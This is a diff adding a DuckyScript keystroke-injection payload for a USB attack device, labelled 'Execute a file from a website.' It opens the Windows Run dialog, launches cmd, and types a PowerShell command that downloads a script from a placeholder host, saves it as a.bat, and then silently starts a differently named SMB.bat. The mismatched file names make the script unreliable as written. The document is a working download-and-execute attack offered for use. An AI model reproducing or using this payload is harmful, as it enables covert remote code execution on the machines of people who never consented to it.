@@ -1,0 +1,16 @@
+REM   --------------
+REM   Discription: Execute a file from a website.
+REM   Author:      Bastiaan Groen
+REM   version:     1.0
+REM   Date:        12-11-2018
+REM   --------------
+REM
+DELAY 950
+GUI r
+DELAY 550
+STRING cmd
+ENTER
+DELAY 350
+REM -- Change to location of hosted powershellScript.txt --
+STRING (powershell -Command "& {Invoke-WebRequest -Uri www.yourSite.com/powershellScript.txt -OutFile a.bat}") & start /min SMB.bat & exit
+ENTER
